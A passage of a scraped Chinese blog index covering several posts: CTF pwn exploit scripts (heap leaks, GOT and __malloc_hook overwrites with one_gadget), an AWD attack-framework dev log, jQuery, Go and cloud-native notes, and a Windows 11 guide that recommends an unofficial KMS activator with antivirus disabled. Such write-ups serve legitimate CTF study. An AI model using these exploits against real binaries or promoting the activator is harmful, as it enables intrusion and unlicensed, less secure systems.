1234567891011121314151617181920212223242526272829303132333435363738394041424344def reg(size,name): sla('choice:',2) sla(':',size) sla(':',name) sla(':',20) sla(':','desc')def login(name): sla('choice:',1) sla(':',name)def logout(): sla('choice:',6)def add_free(name,choice): sla('choice:',3) sla(':',name) sla('(a/d)', choice)def view_profile(): sla('choice:',1)def edit(name): sla('choice:',2) sa(':', name) sla(':',20) sla(':','desc')reg(8,'a'*6)reg(8,'b'*6)login('b'*6)add_free('b'*6,'a')add_free('b'*6,'d')view_profile()ru('Age:')base = int(ru('\\n'),16)-88-libc.sym['__malloc_hook']-0x10leak('base',base)puts = base + libc.sym['puts']logout()reg(0x20, p64(elf.got['puts']))login(p64(puts))edit(p64(base+0x4526a)[:-2]) semifinal_pwn2这题比较有意思，程序是一个brainfuck解释器，规则是： &lt;: p-- &gt;: p++ .: putc(*p) ,: read(0,p,1) +: *p++ -: *p-- 换句话说已经可以构造任意地址读写了，那么首先利用上述规则泄露stdin来泄露libc，然后用one_gadget覆盖got表。 1234567891011121314stdin = 0x602090star = 0x6020c0exit = elf.got['exit']payload = '&lt;'*(star-stdin) + '.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;'payload += '&lt;'*(stdin+6-exit) + ',&gt;,&gt;,&gt;,&gt;,&gt;,'sla(': ',payload)stdin = uu64(r(6))base = stdin - libc.sym['_IO_2_1_stdin_']leak('base',base)one = p64(base + 0xf1147)for i in range(6): s(one[i]) semifinal_pwn3本题当输入选项为1337时会调用一个奇怪的函数，但实际上由于uaf漏洞的存在这个函数并没有什么用。还有一个比较少见的clean功能用于清除所有指针，这里是不存在uaf的。 我们可以直接unsorted bin泄露libc（这里是通过clean功能清楚指针，重新申请到释放的small chunk后泄露bk），然后double free写malloc_hook，最后故意double free触发malloc_print_err，调用malloc_hook。 1234567891011121314151617181920212223242526def clean(): sla('choice :', 4)add(0x80)add(0x60)add(0x60)free(0)clean()add(0x80)show()ru('a'*8)base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10leak('base',base)malloc_hook = base + libc.sym['__malloc_hook']one = base + 0xf02a4free(1)free(2)free(1)add(0x60,p64(malloc_hook-0x23))add(0x60)add(0x60)add(0x60,'a'*0x13 + p64(one))free(0)free(0) # malloc_print_err","link":"/post/WDB2018Pwn/"},{"title":"jQuery 踩坑记","text":"开发项目时踩到的坑。 包含jQuery库可以下载到项目目录里通过相对路径调用，不过我更偏向于通过cdn来包含这些开源库： 1&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt; 新增元素click事件对于通过js新增加到html中的元素，jQuery原来的选择器.click()会失效。解决方法是采用.on()方法绑定到body。例如： 1$(document).on('click', '.exp', function() {...}); 就相当于原来的$('.exp').click(function() {...});。 ajax发送表单数据发送表单数据（FormData）时，需要将processData和contentType设置为false，否则无法正确传输。 12345678910$.ajax({ method: 'POST', url: url, dataType: 'JSON', data: fData, cache: false, processData: false, contentType: false, ...}); ajax异步修改变量值由于ajax发送异步请求（相当于并行请求），在ajax的success方法里想要修改变量的值是比较困难的。如果想要修改变量值，一般都会设置async: false来强制发送同步请求，但这样也就让ajax失去了意义。 退而求其次的办法是，在ajax里只修改全局变量，并且推迟使用被修改变量的值。 通过循环绑定click事件这里会遇到的问题是，所有的click事件都被绑定到了最后绑定的那个函数上。原因是js中的函数都是在调用时才被解析的。通过查阅资料，得到的解决方法之一是采用.each()方法： 12345$('img').each(function (index) { $(this).click(function () { //... });} 这里的参数index表示符合选择器规则的元素的索引。例如本例中，在对应html中的第3个&lt;img&gt;标签，其index值就为2。要引用索引为index的元素，在这里只需要$('img').eq(index)即可。","link":"/post/jQuery/"},{"title":"pAssWD 开发记录","text":"Platform for Attacking Swiftly &amp; Smoothly With Defending pAssWD 简介我和两位研究生学长在打了几次 AWD 比赛后，深深体会到了经验和工具对这种比赛模式的巨大帮助。前者只能靠多参加比赛来积累，后者却是可以自己逐步收集的。为了在 AWD 比赛中发挥地更加出色，我们开始搭建自己的 AWD 框架，我给它起了个有趣的名字：pAssWD (Platform for Attacking Swiftly &amp; Smoothly With Defending)。 我们相信，这一框架将改善我们的 AWD 比赛体验。 开始开发项目基于我们已经收集到的一些 python 脚本。考虑到兼容性问题，统一版本为 Python 2.7。为了增加灵活性和可移植性，我们采用前后端分离开发。这样我不仅可以做 web 端，还可以构建跨平台的 Electron 桌面端。最终分工为两位学长负责后端开发，我负责前端开发。 技术架构 前端 Quasar Framework (Vue.js) 后端 Flask (Python) Tornado (Python) 需求通过交流确定了一些尚不成熟的需求，这里仅包含核心功能： 登录与认证 配置比赛信息和靶机信息 文件上传与共享 实时读取并显示系统日志与靶机日志 备份 web 目录 解压本地备份文件并查杀后门 根据后门生成混淆 payload 根据攻击日志生成 payload 自动化攻击 区分不同语言文件 java 流量记录 开发初期Login首先是登录功能（注册比较简单），后端采用 HTTP Basic Auth 配合 jwt 进行认证。因此我使用 axios 模块config中的auth这个字段来设置 Basic Auth 内容。那么登录时的代码就类似： 123456this.$axios.get(&quot;token&quot;, { auth: { username: this.username, password: sha256(this.password), },}); 这里对密码进行了哈希后发送，方便直接存储到数据库，同时避免明文传输。 随后会收到一个 jwt，我需要做的就是将该 jwt 进行 base64 后，拼接到Basic后面并填入 HTTP 请求头Authorization中。考虑到之后的所有请求都需要这一步，我将该过程放在了请求拦截器中： 123456789101112131415161718192021// http basic authVue.prototype.$token = () =&gt; { let state = JSON.parse(sessionStorage.getItem(&quot;store&quot;)); if (state) { let info = state.userInfo; if (info) { return &quot;Basic &quot; + Base64.encode(info.token + &quot;:&quot;); } return &quot;&quot;; }};Vue.prototype.$axios.interceptors.request.use( (config) =&gt; { config.headers.Authorization = Vue.prototype.$token(); return config; }, (err) =&gt; { Promise.reject(err); }); 这里维护登录状态的方式一如既往，将store整个存入sessionStorage，页面刷新时取回。 完成了请求拦截器的设置，就可以保证登录后发出的请求都带有认证 token 了。 顺带一提，注册功能虽然实现了，但是并没有在 UI 中直接开放。我们认为实际使用中该功能没有必要，因此仅仅用来调试。 Settings这个部分技术上其实没有太多突破，主要时间花在沟通上了。最初没有考虑不同比赛的问题，因此 Settings 页面直接放了靶机设置。但是引入不同比赛后，每个比赛都有自己的靶机，因此分出了一个 Competition 页面用来对比赛进行详细设置，包括设置靶机。 首先遇到的问题是，由于设置了表单验证，在填写 ssh 信息时如果空着会触发提示，就像这样： 然而文本框内部右侧多出来的警告图标会导致文本框的长度被改变，从而改变同一行内其它元素的位置。我的解决方案是设置小于原宽度的max-width，使得文本框长度固定。 然后需要对靶机信息进行增删改查，界面大概是这样的： 这里的问题在于当点击保存后，有可能向数据库插入所有数据，即使其中有一部分已经存在。因此后端多发送了一个id字段，前端点击保存发送数据时，如果某条数据没有id，说明不在数据库中，是新增的数据；否则就是已有数据，正在进行修改。 类似的问题出现在删除上。点击加号后界面上会多出一行靶机信息，但还没有持久化到数据库里。如果这时候点击删除，那么是不需要和后端交互的。然而如果是对数据库中已存在的数据点击删除，则需要发送请求了。怎么区分这两种情况呢？答案是一样的，借助上面提到的id字段。 接下来花了很长时间做浏览器端的 ssh，经过一段时间的选型最终决定后端采用基于 tornado 的 webssh，前端采用 xterm.js 来进行交互，协议是 websocket。连接 webssh 的过程比较复杂，因此我画了一张图来让自己理解： 在这个部分上我们花了如此多的时间，以至于最后看到这个界面时，我们都长舒了一口气： 本来还以为要用别的办法来连接 ssh 了。这都要感谢 webssh 项目支持通过 api 方式登录。 webssh 的速度比我想象的快。 最后在这个部分又花了些时间讨论 ssh 页面加侧边栏和“一键”系列功能的事情，不过后来移动到别的板块了。 Sharing这里就是文件上传、下载、获取文件列表的功能，没有什么难度。不过在把脚本上传到靶机时，耗时比较长，因此添加了 loading 的标识来改善用户体验。 在这一阶段的开发中我们开始通过api_doc.md来沟通，大体上就是一个 api 列表和 todolist 的结合： 123456789101112131415161718- auth.py: - [x] /api/users/reg - methods=['POST'] - recv: `{username,password}` - return: `{data:{username}}` - [x] /api/users/&lt;int:id&gt; - methods=['GET'] - recv: `id` - return: `{data:{username}}` - [x] /api/token - methods=['GET'] - recv: Basic Auth (`username,password`) or (`&quot;username&quot;:token,&quot;password&quot;:any`) - return: `{data:{token,username,duration}}` - [x] /api/resource - methods=['GET'] - recv: Basic Auth - return: `{data:&quot;Hello, %s!&quot; % username}` 选择这种方式是因为 flask 的 swagger 插件需要重构代码…… 在这个部分，第一次出现需要获取当前比赛的所有靶机信息的需求。后来我将这个功能封装成了一个异步函数： 123456789101112131415// get current gameboxesVue.prototype.$getTargets = async function () { let curComp = await this.$axios.get(&quot;get_current_game&quot;).then((res) =&gt; { if (res) { return res.data.data; } }); if (!curComp) return []; return this.$axios.get(`get_ssh/game/${curComp}`).then((res) =&gt; { if (res) { return res.data.data; } });}; 顺便学了下async/await用法。之前对await有些误解，实际上这里的await仅仅保证curComp在后续使用时已经接收到了Promise对象resolve的值，异步调用依然是异步调用。 Backing up这个部分基本都是后端的活。不过目前，查杀后门和 web 应用识别两个功能虽然已经测试成功，但是还没有想好对应的 UI 怎么做。 Logging这是花费时间最长的部分，主要是由于中间一段时间我和后端同学空闲时间总是错开、以及引入 SSE 后后端出了很多错误。 日志记录分为两个部分，pAssWD 系统的日志以及每个靶机自己的日志。靶机日志又分为 web 日志和 attack 日志，后者是前者的真子集，仅包含了被认为是恶意攻击的日志。这里首先需要新日志的消息提醒，最初想通过 websocket 来做，后来采用了更轻量级的 SSE。 前端进行消息提醒的逻辑很简单：登录时建立 SSE 连接，收到新日志时，Vuex 维护的 logs 变量就+1。这会导致 Logging 侧边栏出现红点，而当点进 Logging 页面后红点就会消失。 之后就是在 Logging 页面通过 API 获取日志列表。其中message，param，data三项由于各种原因（长度过长、格式变化太多），我选择在每条日志的最后让用户点击按钮自行查看 json 格式的数据。如图： 中间出现了一些沟通上的问题，大多围绕数据格式、数据获取方式等问题。主要是因为我不熟悉后端的实现、后端也不熟悉前端的一些原理导致的。 最后就是如何让用户不刷新页面也能接收新日志的问题了。目前和后端讨论下来，虽然后端已经给出了一种解决方案，暂时还是将该功能的开发延后到开发中期。 日志这一块还有一些问题没有解决，将在后续和实时接收日志功能一起解决。解决这些问题需要的时间，估计不少于我们在 webssh 问题上花费的。 开发中期2020 年 6 月 27 日，pAssWD v0.1.0 发布，标志着开发初期的结束。目前 pAssWD 已经可以在 AWD 赛事中起到一定作用了。同一天又发布了 v0.1.1，修复了由于代码优化导致的 bug。 中期开始写 CHANGELOG，学习了像 SemVer, badges 以及 GitHub commit message 的 Angular 规范等等。大约在 v0.3.0 发布前学习了利用 GitHub Actions 进行持续部署，感觉开发流程确实有必要引入自动化。 更新中……","link":"/post/pAssWD/"},{"title":"zkw 线段树","text":"%。 关于zkw线段树是啥,参见他本人的ppt:统计的力量 (相比递归版线段树:)优点:代码量较少,空间需求略少(实际上不需要4倍),运行效率较高(非递归);缺点:应用范围有限制.尽管可以稍加修改就支持单点更新/单点查询/区间更新/区间求和/区间RMQ等,但其中部分功能似乎不能同时实现… 总体来说,无论是代码量还是应用范围都介于树状数组和递归版线段树之间. 关于这个数据结构还在摸索…下面是两个栗子: HDU 1166 敌兵布阵https://cn.vjudge.net/problem/HDU-116(不要问为什么放vjudge的链接…因为懒) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;using namespace std;const int maxn = 5e5+5;int T[maxn&lt;&lt;2], n, M;inline void pushup(int x){ T[x] = T[x&lt;&lt;1] + T[x&lt;&lt;1|1];}inline void build(){ for (M = 1; M &lt;= n+1; M &lt;&lt;= 1); for (int i = M+1; i &lt;= M+n; ++i) scanf(&quot;%d&quot;, T+i); for (int i = M-1; i; --i) pushup(i);}inline void add(int x, int y){ for (T[x+=M] += y, x&gt;&gt;=1; x; x&gt;&gt;=1) pushup(x);}inline void sub(int x, int y){ for (T[x+=M] -= y, x&gt;&gt;=1; x; x&gt;&gt;=1) pushup(x);}inline int query(int s, int t){ int ans = 0; for (s += M-1, t += M+1; s^t^1; s&gt;&gt;=1, t&gt;&gt;=1) { if (~s&amp;1) ans += T[s^1]; if (t&amp;1) ans += T[t^1]; } return ans;}int main(){ int t, a, b, k = 0; char op[10]; cin &gt;&gt; t; while (t--) { printf(&quot;Case %d:\\n&quot;, ++k); memset(T, 0, sizeof T); scanf(&quot;%d&quot;, &amp;n); build(); while (~scanf(&quot;%s&quot;, op) &amp;&amp; strcmp(op, &quot;End&quot;)) { if (!strcmp(op, &quot;Query&quot;)) {scanf(&quot;%d%d&quot;, &amp;a, &amp;b); printf(&quot;%d\\n&quot;, query(a,b));} else if (!strcmp(op, &quot;Add&quot;)) {scanf(&quot;%d%d&quot;, &amp;a, &amp;b); add(a,b);} else {scanf(&quot;%d%d&quot;, &amp;a, &amp;b); sub(a,b);} } } return 0;} EOJ 3389 线段树:点增加http://acm.ecnu.edu.cn/problem/3389/微坑的模板题. 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;bits/stdc++.h&gt;using namespace std;#define pushup(x) T[x]=T[x&lt;&lt;1]+T[x&lt;&lt;1|1]const int maxn = 500005;int n, m, M;long long T[maxn&lt;&lt;4];inline void build(){ for (M = 1; M &lt;= n+1; M &lt;&lt;= 1); for (int i = M+1; i &lt;= M+n; ++i) scanf(&quot;%lld&quot;, T+i); for (int i = M-1; i; --i) pushup(i);}inline void update(int x, int y){ for (T[x+=M] += y, x&gt;&gt;=1; x; x&gt;&gt;=1) pushup(x);}inline void query(int s, int t){ long long ans = 0; for (s += M-1, t += M+1; s^t^1; s&gt;&gt;=1, t&gt;&gt;=1) { if (~s&amp;1) ans += T[s^1]; if (t&amp;1) ans += T[t^1]; } printf(&quot;%lld\\n&quot;, ans);}int main(){ int op, x, y; scanf(&quot;%d&quot;, &amp;n); build(); scanf(&quot;%d&quot;, &amp;m); while (m--) { scanf(&quot;%d%d%d&quot;, &amp;op, &amp;x, &amp;y); (op == 1) ? update(x, y) : query(x, y); } return 0;}","link":"/post/ZkwTree/"},{"title":"腾讯生态的泥沼","text":"记录了开发中遇到的和腾讯生态相关的一些问题。 我曾经抱怨 QQ 的花里胡哨，后来出现了微信；我曾经抱怨微信的功能残疾，后来出现了微信小程序；我曾经抱怨小程序的生态封闭，现在发现原来 QQ 和微信的内置浏览器也是一样的。 腾讯云 COS先记录一个无可厚非的小问题，出现在 Go SDK 文档中“预签名 URL”部分。实际上，文档中并没有出现错误，只是对于初次接触的开发者来说可能造成误解。 开发中的一个常见需求就是向 COS 上传文件，然后获取对应的 URL 供前端下载该文件。因此在文档中，我首先看到了“上传请求示例”的代码： 123456789101112131415161718192021222324252627282930ak := &quot;SECRETID&quot;sk := &quot;SECRETKEY&quot;name := &quot;exampleobject&quot;ctx := context.Background()f := strings.NewReader(&quot;test&quot;)// 1. 通过普通方式上传对象_, err := client.Object.Put(ctx, name, f, nil)if err != nil { panic(err)}// 获取预签名URLpresignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodPut, name, ak, sk, time.Hour, nil)if err != nil { panic(err)}// 2. 通过预签名方式上传对象data := &quot;test upload with presignedURL&quot;f = strings.NewReader(data)req, err := http.NewRequest(http.MethodPut, presignedURL.String(), f)if err != nil { panic(err)}// 用户可自行设置请求头部req.Header.Set(&quot;Content-Type&quot;, &quot;text/html&quot;)_, err = http.DefaultClient.Do(req)if err != nil { panic(err)} 显然，这里的 1、2两点是两种不同的上传方式，我这里选择使用第一种方式，并通过第 14 行的代码获取了预签名 URL。然而，访问这一 URL 却会返回“签名不一致”的错误信息，无法下载文件。 继续向下看文档，可以看到“下载请求示例”的代码： 1234567891011121314151617181920212223242526ak := &quot;SECRETID&quot;sk := &quot;SECRETKEY&quot;name := &quot;exampleobject&quot;ctx := context.Background()// 1. 通过普通方式下载对象resp, err := client.Object.Get(ctx, name, nil)if err != nil { panic(err)}bs, _ := ioutil.ReadAll(resp.Body)resp.Body.Close()// 获取预签名URLpresignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodGet, name, ak, sk, time.Hour, nil)if err != nil { panic(err)}// 2. 通过预签名URL下载对象resp2, err := http.Get(presignedURL.String())if err != nil { panic(err)}bs2, _ := ioutil.ReadAll(resp2.Body)resp2.Body.Close()if bytes.Compare(bs2, bs) != 0 { panic(errors.New(&quot;content is not consistent&quot;))} 如果使用第 13 行的代码来获取预签名 URL，则访问该 URL 可以成功下载文件，这也是这段代码叫“下载请求示例”的原因。不难发现，两种获取 URL 的方式唯一的区别在于第二个参数，下载采用 GET 方法，上传采用 PUT 方法。因此实际上“获取预签名 URL”的这段代码并不属于第一种方法，而是属于第二种方法。 我们可以修改注释来避免产生误解，如上传请求示例： 12345678910111213141516171819202122232425262728293031ak := &quot;SECRETID&quot;sk := &quot;SECRETKEY&quot;name := &quot;exampleobject&quot;ctx := context.Background()f := strings.NewReader(&quot;test&quot;)// 1. 通过普通方式上传对象_, err := client.Object.Put(ctx, name, f, nil)if err != nil { panic(err)}// 2. 通过预签名方式上传对象// 获取预签名URLpresignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodPut, name, ak, sk, time.Hour, nil)if err != nil { panic(err)}// 上传对象data := &quot;test upload with presignedURL&quot;f = strings.NewReader(data)req, err := http.NewRequest(http.MethodPut, presignedURL.String(), f)if err != nil { panic(err)}// 用户可自行设置请求头部req.Header.Set(&quot;Content-Type&quot;, &quot;text/html&quot;)_, err = http.DefaultClient.Do(req)if err != nil { panic(err)} 下载请求示例： 123456789101112131415161718192021222324252627ak := &quot;SECRETID&quot;sk := &quot;SECRETKEY&quot;name := &quot;exampleobject&quot;ctx := context.Background()// 1. 通过普通方式下载对象resp, err := client.Object.Get(ctx, name, nil)if err != nil { panic(err)}bs, _ := ioutil.ReadAll(resp.Body)resp.Body.Close()// 2. 通过预签名URL下载对象// 获取预签名URLpresignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodGet, name, ak, sk, time.Hour, nil)if err != nil { panic(err)}// 下载对象resp2, err := http.Get(presignedURL.String())if err != nil { panic(err)}bs2, _ := ioutil.ReadAll(resp2.Body)resp2.Body.Close()if bytes.Compare(bs2, bs) != 0 { panic(errors.New(&quot;content is not consistent&quot;))} 最后，对于正常业务中先上传文件、后返回下载 URL 的需求，我们可以拼接两份示例代码： 123456789101112131415161718ak := &quot;SECRETID&quot;sk := &quot;SECRETKEY&quot;name := &quot;exampleobject&quot;ctx := context.Background()f := strings.NewReader(&quot;test&quot;)// 通过普通方式上传对象_, err := client.Object.Put(ctx, name, f, nil)if err != nil { panic(err)}// 获取预签名URLpresignedURL, err := client.Object.GetPresignedURL(ctx, http.MethodGet, name, ak, sk, time.Hour, nil)if err != nil { panic(err)}// return presignedURL.String() 微信内置浏览器以下问题在安卓 / 苹果手机自带的浏览器中均不存在： 上传文件时，无法识别 accept=&quot;.mp4,.mov&quot; 等扩展名限制，只能使用 accept=&quot;video/*&quot; 等类型限制。 上传多个文件时，无法同时使用多个类型限制（如 accept=&quot;image/*, video/*&quot;）。于是只能将图片和视频上传分开了。 下载文件时，无法调用标准 web api 中的对应接口。我在项目中是根据这个办法判断是否在微信浏览器中，随后向后端传递不同的参数，使得后端返回不同类型的结果。 打开外部 URL 时，无法调用标准 web api 中的对应接口。后来这个需求改了，绕过了这个问题。 通过 URL 打开视频时，可以播放，右下角也有下载按钮，但无法下载。因为是后台的功能，主要使用平台是 PC Web 端，所以没解决。 解决上述问题的通用方案，是引导用户点击右上角并选择“在浏览器中打开”，这个措施平时也见得很多了。 为什么微信内置浏览器如此特别？其实还是微信小程序一样的套路，强迫开发者使用自己的 SDK。 总的来说，有意不遵循通用的 Web API、封闭自己的生态，无论是出于什么目的都令人作呕。","link":"/post/TencentShit/"},{"title":"在 MacBook Pro M1 上运行 Windows 11","text":"拖了很久才来尝鲜。 借助 Parallels Desktop 17，搭载 M1 芯片的 MBP 也可以运行 ARM 版的 Windows 了。很想尝试一下最新的 Win11，但却发现不满足需要 TPM 芯片的要求，因此想办法绕过了这一限制。 获取系统 ISO为了绕过 TPM，需要采用从 Win10 升级的方法。首先在 UUP dump 下载 Win10 arm64 及 Win11 arm64 的脚本（测试时采用的均为最新的 Insider Preview 版本），在一台 Windows 电脑上运行 uup_download_windows.cmd 即可打包好两个 ISO。 之所以需要 Windows 电脑来运行脚本，是因为需要在 ISO 中包含 Windows 更新。如果无视更新，也可以在 Linux 或 macOS 上运行相应平台的脚本。 手动制作升级包通过正常流程在 Parallels 中安装好 Win10 虚拟机，随后将两个 ISO 拖入虚拟机中。将 Win10 的 ISO 中的全部文件复制到虚拟机中的一个目录下，随后用 Win11 的 ISO 中的如下三个文件，替换该目录下的同名文件： sources/install.wim sources/boot.wim sources/winsetupboot.sys 这样升级包就做完了。可以发现，这样做本质上是为了在安装 Win 11 时，让安装向导认为安装的系统版本是 Win10。 升级到 Windows 11运行上述目录下的 setup 程序，耐心等待即可。 后续版本升级由于 Windows 11 ARM 还在预览体验阶段，需要拥有一个注册了 Windows 预览体验计划的账号并在虚拟机里登录。登录后就可以在设置中方便地进行后续更新了。 激活经过粗略调查，目前唯一比较可靠的非正规方法是使用 HEU KMS 24 这款激活工具，使用前需要关闭 Windows 安全中心的病毒防护相关功能。","link":"/post/M1Win11/"},{"title":"Go Error 处理","text":"底层包装、中层传递、顶层处理。 Sentinel Errorsgo 中存在一些预定义的错误，比如 io.EOF，在使用时通常用 if err == io.EOF 的形式来比较两个错误是否“相等”。然而，如果错误中需要携带一些错误信息，就不得不采用如下两种方法之一： 返回一个不同的、携带了错误信息的错误。这会儿导致在和 Sentinel Error 比较时， == 失效。 用 fmt.Errorf()，同样会导致 == 失效。 此时，我们只能使用 error.Error() 来在程序中判断错误类型，然而这个方法设计初衷仅仅是为了提供错误信息。 除此之外，如果在编写 API 时使用 Sentinel Error，则该 Error 会成为 API 的公共部分。同时，也会仅仅因为需要判断一个错误而引入一个不必要的依赖。由于上述三个缺点，我们需要尽量避免使用 Sentinel Error。 Custom Errors通过实现 error 接口来自定义错误类型： 12345678910111213141516171819202122232425type MyError struct { Msg string File string Line int}func (e *MyError) Error() string { return fmt.Sprintf(&quot;%s:%d %s&quot;, e.File, e.Line, e.Msg)}func test() error { return &amp;MyError{&quot;Somthing happened&quot;, &quot;server.go&quot;, 42}}func main() { err := test() switch Err := err.(type) { case nil: // success case *MyError: fmt.Println(&quot;error in line:&quot;, err.Line) default: // unknown }} 这种做法能够返回额外的错误信息，然而并没有解决 Sentinel Error 的第二个问题，因此也不推荐在编写 API 时过多使用。 Opaque Errors不透明就是指当前函数知道发生了错误，但并不清楚除此以外的任何细节。实际上就是： 1234567func fn() error { //... if err != nil { return err } // ...} 但是如果我们确实需要在当前函数里获取错误的一些细节呢？此时我们不应该考虑去判断错误的类型或值，而是判断错误是否执行了某些行为： 1234567package nettype Error interface { error Timeout() bool Temporary() bool} 123if nerr, ok := err.(net.Error); ok &amp;&amp; nerr.Temporary() { // handle error} 实际应用中，可以单独编写函数来判断错误执行的行为： 12345678type temporary interface { Temporary() bool}func IsTemporary(err error) bool { te, ok := err.(temporary) return ok &amp;&amp; te.Temporary()} 这种做法使得我们不需要导入定义错误的包，也不需要了解错误的类型信息，相对灵活。只不过，它仍然不能解决如何返回错误信息的问题。 Wrap Errors为了彻底解决上述问题，我们可以使用 github.com/pkg/errors 包。它提供了： Wrap() 方法来包装错误、错误信息和堆栈信息 Cause() 方法来解包装以得到原来的错误本身 WithMessage() 方法仅包装错误和错误信息 这使得我们既能够获得错误本身、又能够获得错误信息，使用起来很方便： 在业务代码中，一般使用 errors.New() 产生错误 在业务代码中与其他包协作时，使用 errors.Wrap() 包装错误 需要与 Sentinel Errors 比较时，调用 errors.Cause() 获取原始错误 调用其他包中的方法时，直接返回错误本身 在程序顶层处理捕获到的错误，例如可以用 %+v 打印堆栈信息 在非业务代码中（如编写库时），只能返回原始错误 错误被处理后，不能再被继续返回 简单来说，就是底层包装、中层传递、顶层处理。 Go 1.13 ErrorsGo 1.13 的 errors 标准库中引入了 Is 和 As 方法，只要错误类型中实现了 Unwrap() 方法返回原始错误，就可以用 errors.Is(err, MyError) 来代替 == 判断错误值，并通过 errors.As(err, &amp;myError) 代替类型断言判断错误类型。 不过，github.com/pkg/errors 也兼容这一特性，因此可以替代标准库使用。 Eliminate Errors不停地写 if err != nil 挺烦的，所以我们想尽量少写点。比如在下面这个例子中，我们想要统计文件行数： 123456789101112131415161718192021func CountLine(r io.Reader) (int, error) { var ( br = bufio.NewReader(r) lines int err error ) for { _, err = br.ReadString('\\n') lines++ if err != nil { break } } if err != io.EOF { return 0, err } return lines, nil} 在 for 循环中 ReadString 出错，或是无内容可读返回 io.EOF，都会跳出循环，这就要求我们捕获两次错误。 但如果我们借助 Scanner 的 Scan() 方法和 Err() 方法，就可以去掉错误捕获的代码： 12345678910func CountLines(r io.Reader) (int, error) { sc := bufio.NewScanner(r) lines := 0 for sc.Scan() { lines++ } return lines, sc.Err()} 可以发现，Scanner 在出错时会将错误暂存到 sc.Err() 的返回值中。我们也可以模仿这个思路，把一个 error 和一个容易产生错误的对象一起封装进一个结构体里，然后在方法内部直接捕获错误： 1234567891011121314type errWriter struct { io.Writer err error}func (e *errWriter) Write(buf []byte) (int, error) { if e.err != nil { return 0, e.err } var n int n, e.err = e.Writer.Write(buf) return n, nil} 这样，在调用 Write 方法时（例如 io.Copy）就不再需要在外部处理错误了。","link":"/post/GoError/"},{"title":"云原生技术原理","text":"精密而复杂。 容器NamespaceLinux 采用 Namespace 技术进行资源隔离，可以为不同进程分配不同的 Namespace，有点类似沙箱的概念。在 Linux 进程的数据结构中，nsproxy 结构体负责管理 Namespace： 12345678struct nsproxy { atomic_t count; struct uts_namespace *uts_ns; struct ipc_namespace *ipc_ns; struct mnt_namespace *mnt_ns; struct pid_namespace *pid_ns_for_children; struct net *net_ns;} 默认情况下父子进程共享 Namespace，但也可以通过调用 clone、setns、unshare 等方法手动指定和修改 Namespace。 以上面结构体的 pid_namespace 为例，两个不同的 PID Namespace 下的进程之间是互不影响的。类似的，网络、文件系统、用户、挂载点等的 Namespace 之间也同理。 可以看到，Docker 实际上就是对 Namespace 的一次封装，因此在宿主机上调试 Docker 内部程序时，也可以借助 Namespace 的命令行工具。先获取对应容器的 PID： 1docker inspect [docker id] | grep pid 再用 nsenter 进入对应的 Namespace，例如进入网络 Namespace 使用 -n： 1nsenter -t [pid] -n [cmd] CgroupsCgroups 对进程使用的计算资源进行管控，对不同类型的资源采用不同子系统，并在子系统中采用层级树结构（/sys/fs/cgroup）。 🌰 限制进程使用的 CPU 资源首先进入 cpu 子系统，将进程加入 cgroup： 12cd /sys/fs/cgroup/cpuecho [pid] &gt; cgroup.procs 随后关注 cpu.cfs_quota_us 和 cpu.cfs_period_us，两者的比值即进程能占用 CPU 资源的最高比例，默认值为 -1（无限制） 和 100000。 例如，设置最多占用 25% CPU 资源： 1echo 25000 &gt; cpu.cfs_quota_us UnionFS顾名思义，UnionFS 可以对文件系统“取并集”，也就是将不同目录挂载到同一个虚拟文件系统下。 经典的 Linux 系统中，使用 bootfs 中的 BootLoader 引导加载 Kernel 到内存中，然后 umount 掉 bootfs。Kernel 加载完成后，就会使用我们熟悉的 rootfs 文件系统。启动时先将 rootfs 设为 readonly 进行检查，随后再设为 readwrite 供使用。 而在 Docker 启动时，检查完 readonly 的 rootfs 后会再 union mount 一个 readwrite 的文件系统，称为一个 FS 层。后续会继续添加 readwrite 的 FS 层，每次添加时将当前最顶层的 FS 层设为 readonly。这实际上就是 docker build 根据 Dockerfile 中每一行的指令堆叠 FS 层的过程。 那么如果要修改下层 readonly FS 层的文件怎么办呢？只需要 Copy-on-Write，将文件复制到可写的顶层并修改即可。这样能成功是因为 Docker 采用的 OverlayFS 在合并上下层同名文件时，优先选择上层文件。 最后，FS 层可以在不同镜像之间复用，节省镜像构建时间和硬盘占用。 ServerlessFaaSServerless 并不是指不需要服务器，而是指对服务器运维的极端抽象。我们知道，在程序设计领域发生的抽象，都是为了降低开发难度和成本、让开发者更专注于真正有价值的工作。因此，Serverless 主要是针对后端运维进行的一种优化。 Serverless 首先提出的概念是函数即服务 FaaS，大体可以分成函数代码、函数服务、触发器三个部分。 触发器接收用户请求并通知函数服务。实际上是对负载均衡、反向代理等中间件工作的抽象 函数服务收到消息后，检查是否有可用的函数实例，没有则通过函数代码来初始化一个新的函数实例；最后将用户请求作为函数参数，执行函数，返回的结果将原路返回。实际上是对代码运行环境的抽象 函数代码一般在 git 之类的版本控制仓库。实际上是对代码上传和部署的抽象 弹性伸缩值得一提的是，FaaS 能根据目前负载对占用资源进行弹性伸缩，无负载时甚至可以不占用资源。这能够很大程度上提升资源利用率。 冷启动冷启动和热启动相反，从一个未初始化的服务开始，直到函数实例执行完毕结束。由于可能涉及比较繁琐的初始化工作，传统服务也许能够在热启动上达到很快的速度，但在冷启动上不行。 FaaS 则通过容器、运行环境、代码三者分层并分别缓存，获得了较快的冷启动速度，一般大约在几百毫秒内。显然，这是牺牲了用户对底层环境的可控性换来的。 语言无关性FaaS 可以替换传统前后端分离开发中的后端服务、可以用来请求公开的 Web API、更重要的是可以和其他云服务商提供的服务进行联动。由于前端只在意最后返回的数据，我们的函数服务完全可以混合采用多种不同的语言来编写，以适应不同的需求。 数据库？FaaS 中的函数实例都活不了太久，有的执行完就被销毁了，而有的可能能在内存中多待一会儿，但云服务商经过一小段时间后仍会销毁它们，这是因为 FaaS 需要弹性伸缩，它的核心是无状态的函数（就像 HTTP 协议是无状态的一样）。 这就给数据持久化带来了问题，比如数据库就不能放在 FaaS 的主进程中。但把数据库单独拿出来，再通过一个进程去连接并访问它，这样又会显著增加冷启动的时间。 